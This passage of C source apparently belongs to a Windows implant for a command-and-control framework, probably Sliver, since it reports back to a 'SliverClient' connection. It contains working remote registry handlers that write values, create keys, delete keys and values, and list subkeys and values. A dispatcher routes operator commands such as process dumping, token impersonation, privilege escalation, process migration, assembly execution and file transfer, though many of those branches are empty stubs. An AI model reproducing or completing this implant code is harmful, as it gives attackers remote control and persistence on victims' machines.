	else if (!lstrcmpA(lpHive, "HKLM")) {
		hRootKey = HKEY_LOCAL_MACHINE;
	}
	else if (!lstrcmpA(lpHive, "HKPD")) {
		hRootKey = HKEY_PERFORMANCE_DATA;
	}
	else if (!lstrcmpA(lpHive, "HKU")) {
		hRootKey = HKEY_USERS;
	}
	else if (!lstrcmpA(lpHive, "HKCC")) {
		hRootKey = HKEY_CURRENT_CONFIG;
	}
	else {
		goto CLEANUP;
	}

	lpTemp = DuplicateStrA(lpPath, 0);
	lpTemp = StrCatExA(lpTemp, "\\");
	lpTemp = StrCatExA(lpTemp, lpValueName);
	Status = RegOpenKeyExA(hRootKey, lpTemp, 0, KEY_WRITE, &hKey);
	if (Status == ERROR_FILE_NOT_FOUND) {
		FREE(lpTemp);
		Status = RegOpenKeyExA(hRootKey, lpPath, 0, KEY_WRITE, &hKey);
	}
	else if (Status == ERROR_SUCCESS) {
		FREE(lpPath);
		lpPath = lpTemp;
		FREE(lpValueName);
		lpValueName = NULL;
		if (dwValueType != REG_SZ) {
			lpErrorDesc = CreateFormattedErr(0, "Cannot assign this registry type to default key value");
			goto CLEANUP;
		}
	}

	if (Status != ERROR_SUCCESS) {
		lpErrorDesc = CreateFormattedErr(Status, "RegOpenKeyExA failed at %s", __FUNCTION__);
		goto CLEANUP;
	}

	Status = RegSetValueExA(hKey, lpValueName, 0, dwValueType, pValue, cbValue);
	if (Status != ERROR_SUCCESS) {
		lpErrorDesc = CreateFormattedErr(Status, "RegSetValueExA failed at %s", __FUNCTION__);
		goto CLEANUP;
	}

	pFinalElement = CreateStructElement(NULL, 0, 9);
	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
	pRespEnvelope->uID = pEnvelope->uID;
	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
	pRespEnvelope->pData->pBuffer = pFinalElement->pMarshalledData;
	pRespEnvelope->pData->cbBuffer = pFinalElement->cbMarshalledData;
	pFinalElement->pMarshalledData = NULL;
	pFinalElement->cbMarshalledData = 0;
CLEANUP:
	if (lpErrorDesc != NULL) {
		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
		FREE(lpErrorDesc);
	}

	if (UnmarshalledData != NULL) {
		for (i = 0; i < _countof(RecvElementList); i++) {
			if (RecvElementList[i]->Type != Varint) {
				FreeBuffer(UnmarshalledData[i]);
			}
		}

		FREE(UnmarshalledData);
	}

	for (i = 0; i < _countof(RecvElementList); i++) {
		FreeElement(RecvElementList[i]);
	}

	if (hKey != NULL) {
		RegCloseKey(hKey);
	}

	if (lpPath != NULL) {
		FREE(lpPath);
	}

	if (lpHive != NULL) {
		FREE(lpHive);
	}

	if (lpValueName != NULL) {
		FREE(lpValueName);
	}

	if (pValue != NULL) {
		FREE(pValue);
	}

	FreeElement(pFinalElement);

	return pRespEnvelope;
}

PENVELOPE RegistryCreateKeyHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PENVELOPE pRespEnvelope = NULL;
	PPBElement RecvElementList[3];
	DWORD i = 0;
	PBUFFER* UnmarshalledData = NULL;
	LPSTR lpHive = NULL;
	LPSTR lpPath = NULL;
	LPSTR lpKeyName = NULL;
	HKEY hRootKey = NULL;
	HKEY hKey = NULL;
	LSTATUS Status = ERROR_SUCCESS;
	LPSTR lpErrorDesc = NULL;
	LPSTR lpTemp = NULL;
	PPBElement pFinalElement = NULL;

	for (i = 0; i < _countof(RecvElementList); i++) {
		RecvElementList[i] = ALLOC(sizeof(PBElement));
		RecvElementList[i]->dwFieldIdx = i + 1;
		RecvElementList[i]->Type = Bytes;
	}

	UnmarshalledData = UnmarshalStruct(RecvElementList, _countof(RecvElementList), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	if (UnmarshalledData == NULL) {
		goto CLEANUP;
	}

	if (UnmarshalledData[0] == NULL || UnmarshalledData[1] == NULL || UnmarshalledData[2] == NULL) {
		goto CLEANUP;
	}

	lpHive = DuplicateStrA(UnmarshalledData[0]->pBuffer, 0);
	lpPath = DuplicateStrA(UnmarshalledData[1]->pBuffer, 0);
	lpKeyName = DuplicateStrA(UnmarshalledData[2]->pBuffer, 0);
	if (!lstrcmpA(lpHive, "HKCR")) {
		hRootKey = HKEY_CLASSES_ROOT;
	}
	else if (!lstrcmpA(lpHive, "HKCU")) {
		hRootKey = HKEY_CURRENT_USER;
	}
	else if (!lstrcmpA(lpHive, "HKLM")) {
		hRootKey = HKEY_LOCAL_MACHINE;
	}
	else if (!lstrcmpA(lpHive, "HKPD")) {
		hRootKey = HKEY_PERFORMANCE_DATA;
	}
	else if (!lstrcmpA(lpHive, "HKU")) {
		hRootKey = HKEY_USERS;
	}
	else if (!lstrcmpA(lpHive, "HKCC")) {
		hRootKey = HKEY_CURRENT_CONFIG;
	}
	else {
		goto CLEANUP;
	}

	lpTemp = DuplicateStrA(lpPath, 0);
	lpTemp = StrCatExA(lpTemp, "\\");
	lpTemp = StrCatExA(lpTemp, lpKeyName);
	Status = RegCreateKeyA(hRootKey, lpTemp, &hKey);
	if (Status != ERROR_SUCCESS) {
		lpErrorDesc = CreateFormattedErr(Status, "RegCreateKeyA failed at %s", __FUNCTION__);
		goto CLEANUP;
	}
	
	pFinalElement = CreateStructElement(NULL, 0, 9);
	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
	pRespEnvelope->uID = pEnvelope->uID;
	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
	pRespEnvelope->pData->pBuffer = pFinalElement->pMarshalledData;
	pRespEnvelope->pData->cbBuffer = pFinalElement->cbMarshalledData;
	pFinalElement->pMarshalledData = NULL;
	pFinalElement->cbMarshalledData = 0;
CLEANUP:
	if (lpErrorDesc != NULL) {
		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
		FREE(lpErrorDesc);
	}

	if (UnmarshalledData != NULL) {
		for (i = 0; i < _countof(RecvElementList); i++) {
			FreeBuffer(UnmarshalledData[i]);
		}

		FREE(UnmarshalledData);
	}

	for (i = 0; i < _countof(RecvElementList); i++) {
		FreeElement(RecvElementList[i]);
	}

	if (hKey != NULL) {
		RegCloseKey(hKey);
	}

	if (lpPath != NULL) {
		FREE(lpPath);
	}

	if (lpHive != NULL) {
		FREE(lpHive);
	}

	if (lpKeyName != NULL) {
		FREE(lpKeyName);
	}

	if (lpTemp != NULL) {
		FREE(lpTemp);
	}

	FreeElement(pFinalElement);

	return pRespEnvelope;
}

PENVELOPE RegistryDeleteKeyHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PENVELOPE pRespEnvelope = NULL;
	PPBElement RecvElementList[3];
	DWORD i = 0;
	PBUFFER* UnmarshalledData = NULL;
	LPSTR lpHive = NULL;
	LPSTR lpPath = NULL;
	LPSTR lpValueName = NULL;
	LPSTR lpKeyName = NULL;
	HKEY hRootKey = NULL;
	HKEY hKey = NULL;
	LSTATUS Status = ERROR_SUCCESS;
	LPSTR lpErrorDesc = NULL;
	LPSTR lpTemp = NULL;
	PPBElement pFinalElement = NULL;

	for (i = 0; i < _countof(RecvElementList); i++) {
		RecvElementList[i] = ALLOC(sizeof(PBElement));
		RecvElementList[i]->dwFieldIdx = i + 1;
		RecvElementList[i]->Type = Bytes;
	}

	UnmarshalledData = UnmarshalStruct(RecvElementList, _countof(RecvElementList), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	if (UnmarshalledData == NULL) {
		goto CLEANUP;
	}

	if (UnmarshalledData[0] == NULL || UnmarshalledData[1] == NULL || UnmarshalledData[2] == NULL) {
		goto CLEANUP;
	}

	lpHive = DuplicateStrA(UnmarshalledData[0]->pBuffer, 0);
	lpPath = DuplicateStrA(UnmarshalledData[1]->pBuffer, 0);
	lpValueName = DuplicateStrA(UnmarshalledData[2]->pBuffer, 0);
	if (!lstrcmpA(lpHive, "HKCR")) {
		hRootKey = HKEY_CLASSES_ROOT;
	}
	else if (!lstrcmpA(lpHive, "HKCU")) {
		hRootKey = HKEY_CURRENT_USER;
	}
	else if (!lstrcmpA(lpHive, "HKLM")) {
		hRootKey = HKEY_LOCAL_MACHINE;
	}
	else if (!lstrcmpA(lpHive, "HKPD")) {
		hRootKey = HKEY_PERFORMANCE_DATA;
	}
	else if (!lstrcmpA(lpHive, "HKU")) {
		hRootKey = HKEY_USERS;
	}
	else if (!lstrcmpA(lpHive, "HKCC")) {
		hRootKey = HKEY_CURRENT_CONFIG;
	}
	else {
		goto CLEANUP;
	}

	lpTemp = DuplicateStrA(lpPath, 0);
	lpTemp = StrCatExA(lpTemp, "\\");
	lpTemp = StrCatExA(lpTemp, lpValueName);
	Status = RegOpenKeyExA(hRootKey, lpTemp, 0, KEY_QUERY_VALUE, &hKey);
	if (Status == ERROR_SUCCESS) {
		lpKeyName = lpValueName;
		lpValueName = NULL;
	}
	else if (Status != ERROR_FILE_NOT_FOUND) {
		lpErrorDesc = CreateFormattedErr(Status, "RegOpenKeyExA failed at %s", __FUNCTION__);
		goto CLEANUP;
	}

	RegCloseKey(hKey);
	Status = RegOpenKeyExA(hRootKey, lpPath, 0, KEY_WRITE, &hKey);
	if (Status != ERROR_SUCCESS) {
		lpErrorDesc = CreateFormattedErr(Status, "RegOpenKeyExA failed at %s", __FUNCTION__);
		goto CLEANUP;
	}

	if (lpValueName == NULL) {
		Status = RegDeleteKeyA(hKey, lpKeyName);
		if (Status != ERROR_SUCCESS) {
			lpErrorDesc = CreateFormattedErr(Status, "RegDeleteKeyA failed at %s", __FUNCTION__);
			goto CLEANUP;
		}
	}
	else {
		Status = RegDeleteValueA(hKey, lpValueName);
		if (Status != ERROR_SUCCESS) {
			lpErrorDesc = CreateFormattedErr(Status, "RegDeleteValueA failed at %s", __FUNCTION__);
			goto CLEANUP;
		}
	}

	pFinalElement = CreateStructElement(NULL, 0, 9);
	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
	pRespEnvelope->uID = pEnvelope->uID;
	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
	pRespEnvelope->pData->pBuffer = pFinalElement->pMarshalledData;
	pRespEnvelope->pData->cbBuffer = pFinalElement->cbMarshalledData;
	pFinalElement->pMarshalledData = NULL;
	pFinalElement->cbMarshalledData = 0;
CLEANUP:
	if (lpErrorDesc != NULL) {
		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
		FREE(lpErrorDesc);
	}

	if (UnmarshalledData != NULL) {
		for (i = 0; i < _countof(RecvElementList); i++) {
			FreeBuffer(UnmarshalledData[i]);
		}

		FREE(UnmarshalledData);
	}

	for (i = 0; i < _countof(RecvElementList); i++) {
		FreeElement(RecvElementList[i]);
	}

	if (hKey != NULL) {
		RegCloseKey(hKey);
	}

	if (lpPath != NULL) {
		FREE(lpPath);
	}

	if (lpHive != NULL) {
		FREE(lpHive);
	}

	if (lpValueName != NULL) {
		FREE(lpValueName);
	}

	if (lpKeyName != NULL) {
		FREE(lpKeyName);
	}

	if (lpTemp != NULL) {
		FREE(lpTemp);
	}

	FreeElement(pFinalElement);

	return pRespEnvelope;
}

PENVELOPE RegistrySubKeysListHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PENVELOPE pRespEnvelope = NULL;
	PPBElement RecvElementList[2];
	PBUFFER* pSubKeys = NULL;
	DWORD i = 0;
	PBUFFER* UnmarshalledData = NULL;
	LPSTR lpHive = NULL;
	LPSTR lpPath = NULL;
	HKEY hRootKey = NULL;
	HKEY hKey = NULL;
	LSTATUS Status = ERROR_SUCCESS;
	LPSTR lpErrorDesc = NULL;
	PPBElement pFinalElement = NULL;
	DWORD cSubKeys = 0;
	DWORD dwMaxSubKeyLength = 0;

	for (i = 0; i < _countof(RecvElementList); i++) {
		RecvElementList[i] = ALLOC(sizeof(PBElement));
		RecvElementList[i]->dwFieldIdx = i + 1;
		RecvElementList[i]->Type = Bytes;
	}

	UnmarshalledData = UnmarshalStruct(RecvElementList, _countof(RecvElementList), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	if (UnmarshalledData == NULL) {
		goto CLEANUP;
	}

	if (UnmarshalledData[0] == NULL || UnmarshalledData[1] == NULL) {
		goto CLEANUP;
	}

	lpHive = DuplicateStrA(UnmarshalledData[0]->pBuffer, 0);
	lpPath = DuplicateStrA(UnmarshalledData[1]->pBuffer, 0);
	if (!lstrcmpA(lpHive, "HKCR")) {
		hRootKey = HKEY_CLASSES_ROOT;
	}
	else if (!lstrcmpA(lpHive, "HKCU")) {
		hRootKey = HKEY_CURRENT_USER;
	}
	else if (!lstrcmpA(lpHive, "HKLM")) {
		hRootKey = HKEY_LOCAL_MACHINE;
	}
	else if (!lstrcmpA(lpHive, "HKPD")) {
		hRootKey = HKEY_PERFORMANCE_DATA;
	}
	else if (!lstrcmpA(lpHive, "HKU")) {
		hRootKey = HKEY_USERS;
	}
	else if (!lstrcmpA(lpHive, "HKCC")) {
		hRootKey = HKEY_CURRENT_CONFIG;
	}
	else {
		goto CLEANUP;
	}

	Status = RegOpenKeyExA(hRootKey, lpPath, 0, KEY_READ, &hKey);
	if (Status != ERROR_SUCCESS) {
		lpErrorDesc = CreateFormattedErr(Status, "RegOpenKeyExA failed at %s", __FUNCTION__);
		goto CLEANUP;
	}

	Status = RegQueryInfoKeyA(hKey, NULL, NULL, NULL, &cSubKeys, &dwMaxSubKeyLength, NULL, NULL, NULL, NULL, NULL, NULL);
	if (Status != ERROR_SUCCESS) {
		lpErrorDesc = CreateFormattedErr(Status, "RegQueryInfoKeyA failed at %s", __FUNCTION__);
		goto CLEANUP;
	}

	pSubKeys = ALLOC(sizeof(PBUFFER) * cSubKeys);
	for (i = 0; i < cSubKeys; i++) {
		pSubKeys[i] = ALLOC(sizeof(BUFFER));
		pSubKeys[i]->cbBuffer = dwMaxSubKeyLength + 1;
		pSubKeys[i]->pBuffer = ALLOC(pSubKeys[i]->cbBuffer);
		Status = RegEnumKeyExA(hKey, i, pSubKeys[i]->pBuffer, &pSubKeys[i]->cbBuffer, NULL, NULL, NULL, NULL);
		if (Status == ERROR_MORE_DATA) {
			pSubKeys[i]->cbBuffer += 1;
			pSubKeys[i]->pBuffer = REALLOC(pSubKeys[i]->pBuffer, pSubKeys[i]->cbBuffer);
			Status = RegEnumKeyExA(hKey, i, pSubKeys[i]->pBuffer, &pSubKeys[i]->cbBuffer, NULL, NULL, NULL, NULL);
			if (Status != ERROR_SUCCESS) {
				lpErrorDesc = CreateFormattedErr(Status, "RegEnumKeyExA failed at %s", __FUNCTION__);
				goto CLEANUP;
			}
		}
		else if (Status == ERROR_NO_MORE_ITEMS) {
			break;
		}
		else if (Status != ERROR_SUCCESS) {
			lpErrorDesc = CreateFormattedErr(Status, "RegEnumKeyExA failed at %s", __FUNCTION__);
			goto CLEANUP;
		}

		pSubKeys[i]->cbBuffer = lstrlenA(pSubKeys[i]->pBuffer);
	}

	pFinalElement = CreateRepeatedBytesElement(pSubKeys, i, 1);
	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
	pRespEnvelope->uID = pEnvelope->uID;
	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
	pRespEnvelope->pData->pBuffer = pFinalElement->pMarshalledData;
	pRespEnvelope->pData->cbBuffer = pFinalElement->cbMarshalledData;
	pFinalElement->pMarshalledData = NULL;
	pFinalElement->cbMarshalledData = 0;
CLEANUP:
	if (lpErrorDesc != NULL) {
		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
		FREE(lpErrorDesc);
	}

	if (UnmarshalledData != NULL) {
		for (i = 0; i < _countof(RecvElementList); i++) {
			FreeBuffer(UnmarshalledData[i]);
		}

		FREE(UnmarshalledData);
	}

	for (i = 0; i < _countof(RecvElementList); i++) {
		FreeElement(RecvElementList[i]);
	}

	if (hKey != NULL) {
		RegCloseKey(hKey);
	}

	if (lpPath != NULL) {
		FREE(lpPath);
	}

	if (lpHive != NULL) {
		FREE(lpHive);
	}

	if (pSubKeys != NULL) {
		for (i = 0; i < cSubKeys; i++) {
			FreeBuffer(pSubKeys[i]);
		}

		FREE(pSubKeys);
	}

	FreeElement(pFinalElement);

	return pRespEnvelope;
}

PENVELOPE RegistryListValuesHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PENVELOPE pRespEnvelope = NULL;
	PPBElement RecvElementList[2];
	PBUFFER* pValues = NULL;
	DWORD i = 0;
	PBUFFER* UnmarshalledData = NULL;
	LPSTR lpHive = NULL;
	LPSTR lpPath = NULL;
	HKEY hRootKey = NULL;
	HKEY hKey = NULL;
	LSTATUS Status = ERROR_SUCCESS;
	LPSTR lpErrorDesc = NULL;
	PPBElement pFinalElement = NULL;
	DWORD cValues = 0;
	DWORD dwMaxValueNameLength = 0;

	for (i = 0; i < _countof(RecvElementList); i++) {
		RecvElementList[i] = ALLOC(sizeof(PBElement));
		RecvElementList[i]->dwFieldIdx = i + 1;
		RecvElementList[i]->Type = Bytes;
	}

	UnmarshalledData = UnmarshalStruct(RecvElementList, _countof(RecvElementList), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	if (UnmarshalledData == NULL) {
		goto CLEANUP;
	}

	if (UnmarshalledData[0] == NULL || UnmarshalledData[1] == NULL) {
		goto CLEANUP;
	}

	lpHive = DuplicateStrA(UnmarshalledData[0]->pBuffer, 0);
	lpPath = DuplicateStrA(UnmarshalledData[1]->pBuffer, 0);
	if (!lstrcmpA(lpHive, "HKCR")) {
		hRootKey = HKEY_CLASSES_ROOT;
	}
	else if (!lstrcmpA(lpHive, "HKCU")) {
		hRootKey = HKEY_CURRENT_USER;
	}
	else if (!lstrcmpA(lpHive, "HKLM")) {
		hRootKey = HKEY_LOCAL_MACHINE;
	}
	else if (!lstrcmpA(lpHive, "HKPD")) {
		hRootKey = HKEY_PERFORMANCE_DATA;
	}
	else if (!lstrcmpA(lpHive, "HKU")) {
		hRootKey = HKEY_USERS;
	}
	else if (!lstrcmpA(lpHive, "HKCC")) {
		hRootKey = HKEY_CURRENT_CONFIG;
	}
	else {
		goto CLEANUP;
	}

	Status = RegOpenKeyExA(hRootKey, lpPath, 0, KEY_READ, &hKey);
	if (Status != ERROR_SUCCESS) {
		lpErrorDesc = CreateFormattedErr(Status, "RegOpenKeyExA failed at %s", __FUNCTION__);
		goto CLEANUP;
	}

	Status = RegQueryInfoKeyA(hKey, NULL, NULL, NULL, NULL, NULL, NULL, &cValues, &dwMaxValueNameLength, NULL, NULL, NULL);
	if (Status != ERROR_SUCCESS) {
		lpErrorDesc = CreateFormattedErr(Status, "RegQueryInfoKeyA failed at %s", __FUNCTION__);
		goto CLEANUP;
	}

	pValues = ALLOC(sizeof(PBUFFER) * cValues);
	for (i = 0; i < cValues; i++) {
		pValues[i] = ALLOC(sizeof(BUFFER));
		pValues[i]->cbBuffer = dwMaxValueNameLength + 1;
		pValues[i]->pBuffer = ALLOC(pValues[i]->cbBuffer);
		Status = RegEnumValueA(hKey, i, pValues[i]->pBuffer, &pValues[i]->cbBuffer, NULL, NULL, NULL, NULL);
		if (Status == ERROR_MORE_DATA) {
			pValues[i]->cbBuffer += 1;
			pValues[i]->pBuffer = REALLOC(pValues[i]->pBuffer, pValues[i]->cbBuffer);
			Status = RegEnumValueA(hKey, i, pValues[i]->pBuffer, &pValues[i]->cbBuffer, NULL, NULL, NULL, NULL);
			if (Status != ERROR_SUCCESS) {
				lpErrorDesc = CreateFormattedErr(Status, "RegEnumKeyExA failed at %s", __FUNCTION__);
				goto CLEANUP;
			}
		}
		else if (Status == ERROR_NO_MORE_ITEMS) {
			break;
		}
		else if (Status != ERROR_SUCCESS) {
			lpErrorDesc = CreateFormattedErr(Status, "RegEnumKeyExA failed at %s", __FUNCTION__);
			goto CLEANUP;
		}

		pValues[i]->cbBuffer = lstrlenA(pValues[i]->pBuffer);
	}

	pFinalElement = CreateRepeatedBytesElement(pValues, i, 1);
	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
	pRespEnvelope->uID = pEnvelope->uID;
	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
	pRespEnvelope->pData->pBuffer = pFinalElement->pMarshalledData;
	pRespEnvelope->pData->cbBuffer = pFinalElement->cbMarshalledData;
	pFinalElement->pMarshalledData = NULL;
	pFinalElement->cbMarshalledData = 0;
CLEANUP:
	if (lpErrorDesc != NULL) {
		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
		FREE(lpErrorDesc);
	}

	if (UnmarshalledData != NULL) {
		for (i = 0; i < _countof(RecvElementList); i++) {
			FreeBuffer(UnmarshalledData[i]);
		}

		FREE(UnmarshalledData);
	}

	for (i = 0; i < _countof(RecvElementList); i++) {
		FreeElement(RecvElementList[i]);
	}

	if (hKey != NULL) {
		RegCloseKey(hKey);
	}

	if (lpPath != NULL) {
		FREE(lpPath);
	}

	if (lpHive != NULL) {
		FREE(lpHive);
	}

	if (pValues != NULL) {
		for (i = 0; i < cValues; i++) {
			FreeBuffer(pValues[i]);
		}

		FREE(pValues);
	}

	FreeElement(pFinalElement);

	return pRespEnvelope;
}

VOID MainHandler
(
	_Inout_ PTP_CALLBACK_INSTANCE Instance,
	_Inout_opt_ PENVELOPE_WRAPPER pWrapper,
	_Inout_ PTP_WORK Work
)
{
	PENVELOPE pResp = NULL;
	PENVELOPE pEnvelope = NULL;

	pEnvelope = pWrapper->pEnvelope;
	if (pEnvelope->uType == MsgTaskReq) {
		
	}
	else if (pEnvelope->uType == MsgProcessDumpReq) {
	
	}
	else if (pEnvelope->uType == MsgImpersonateReq) {
	
	}
	else if (pEnvelope->uType == MsgRevToSelfReq) {
	
	}
	else if (pEnvelope->uType == MsgRunAsReq) {
	
	}
	else if (pEnvelope->uType == MsgInvokeGetSystemReq) {
	
	}
	else if (pEnvelope->uType == MsgInvokeExecuteAssemblyReq) {
	
	}
	else if (pEnvelope->uType == MsgInvokeInProcExecuteAssemblyReq) {
	
	}
	else if (pEnvelope->uType == MsgInvokeMigrateReq) {
	
	}
	else if (pEnvelope->uType == MsgSpawnDllReq) {
	
	}
	else if (pEnvelope->uType == MsgStartServiceReq) {
	
	}
	else if (pEnvelope->uType == MsgStopServiceReq) {
	
	}
	else if (pEnvelope->uType == MsgRemoveServiceReq) {
	
	}
	else if (pEnvelope->uType == MsgEnvReq) {
		pResp = GetEnvHandler(pEnvelope);
	}
	else if (pEnvelope->uType == MsgSetEnvReq) {
	
	}
	else if (pEnvelope->uType == MsgUnsetEnvReq) {
	
	}
	else if (pEnvelope->uType == MsgExecuteWindowsReq) {
	
	}
	else if (pEnvelope->uType == MsgGetPrivsReq) {
	
	}
	else if (pEnvelope->uType == MsgCurrentTokenOwnerReq) {
	
	}
	else if (pEnvelope->uType == MsgRegistryReadHiveReq) {
	
	}
	else if (pEnvelope->uType == MsgIfconfigReq) {
		pResp = IfconfigHandler(pEnvelope);
	}
	else if (pEnvelope->uType == MsgScreenshotReq) {
	
	}
	else if (pEnvelope->uType == MsgSideloadReq) {
	
	}
	else if (pEnvelope->uType == MsgNetstatReq) {
	
	}
	else if (pEnvelope->uType == MsgMakeTokenReq) {
	
	}
	else if (pEnvelope->uType == MsgPsReq) {
		pResp = PsHandler(pEnvelope);
	}
	else if (pEnvelope->uType == MsgTerminateReq) {
	
	}
	else if (pEnvelope->uType == MsgRegistryReadReq) {
		pResp = RegistryReadHandler(pEnvelope);
	}
	else if (pEnvelope->uType == MsgRegistryWriteReq) {
		pResp = RegistryWriteHandler(pEnvelope);
	}
	else if (pEnvelope->uType == MsgRegistryCreateKeyReq) {
		pResp = RegistryCreateKeyHandler(pEnvelope);
	}
	else if (pEnvelope->uType == MsgRegistryDeleteKeyReq) {
		pResp = RegistryDeleteKeyHandler(pEnvelope);
	}
	else if (pEnvelope->uType == MsgRegistrySubKeysListReq) {
		pResp = RegistrySubKeysListHandler(pEnvelope);
	}
	else if (pEnvelope->uType == MsgRegistryListValuesReq) {
		pResp = RegistryListValuesHandler(pEnvelope);
	}
	else if (pEnvelope->uType == MsgServicesReq) {
	
	}
	else if (pEnvelope->uType == MsgServiceDetailReq) {
	
	}
	else if (pEnvelope->uType == MsgStartServiceByNameReq) {
	
	}
	else if (pEnvelope->uType == MsgMountReq) {
	
	}
	else if (pEnvelope->uType == MsgPing) {
	
	}
	else if (pEnvelope->uType == MsgLsReq) {
	
	}
	else if (pEnvelope->uType == MsgDownloadReq) {
	
	}
	else if (pEnvelope->uType == MsgUploadReq) {
	
	}
	else if (pEnvelope->uType == MsgCdReq) {
		pResp = CdHandler(pEnvelope);
	}
	else if (pEnvelope->uType == MsgPwdReq) {
		pResp = PwdHandler(pEnvelope);
	}
	else if (pEnvelope->uType == MsgRmReq) {
		pResp = RmHandler(pEnvelope);
	}
	else if (pEnvelope->uType == MsgMvReq) {
	
	}
	else if (pEnvelope->uType == MsgCpReq) {
	
	}
	else if (pEnvelope->uType == MsgMkdirReq) {
		pResp = MkdirHandler(pEnvelope);
	}
	else if (pEnvelope->uType == MsgExecuteReq) {
	
	}
	else if (pEnvelope->uType == MsgReconfigureReq) {
	
	}
	else if (pEnvelope->uType == MsgSSHCommandReq) {
	
	}
	else if (pEnvelope->uType == MsgChtimesReq) {
	
	}
	else if (pEnvelope->uType == MsgGrepReq) {
	
	}
	else if (pEnvelope->uType == MsgRegisterExtensionReq) {
	
	}
	else if (pEnvelope->uType == MsgCallExtensionReq) {
	
	}
	else if (pEnvelope->uType == MsgListExtensionsReq) {
	
	}
	else if (pEnvelope->uType == MsgRegisterWasmExtensionReq) {
	
	}
	else if (pEnvelope->uType == MsgDeregisterWasmExtensionReq) {
	
	}
	else if (pEnvelope->uType == MsgListWasmExtensionsReq) {

	}
	else if (pEnvelope->uType == MsgIcaclsReq) {
		pResp = IcaclsHandler(pEnvelope);
	}
	else {

	}

	WriteEnvelope(pWrapper->pSliverClient, pResp);
	FreeEnvelope(pResp);
	FreeEnvelope(pEnvelope);
	FREE(pWrapper);

	return;
}

